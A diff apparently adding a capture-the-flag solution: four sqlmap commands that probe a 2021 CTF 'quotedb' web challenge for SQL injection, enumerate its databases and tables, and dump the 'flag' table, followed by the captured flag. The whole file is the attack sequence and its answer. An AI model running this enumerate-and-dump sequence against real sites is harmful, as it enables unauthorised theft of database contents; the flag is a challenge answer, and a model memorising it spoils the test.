@@ -1,0 +1,9 @@
+sqlmap -u https://quotedb-web.2021.ctfcompetition.com/?id=1
+
+sqlmap -u https://quotedb-web.2021.ctfcompetition.com/?id=1 --dbs
+
+sqlmap -u https://quotedb-web.2021.ctfcompetition.com/?id=1 -D quotedb --tables
+
+sqlmap -u https://quotedb-web.2021.ctfcompetition.com/?id=1 -D quotedb -T flag --dump
+
+CTF{little_bobby_tables_we_call_him}
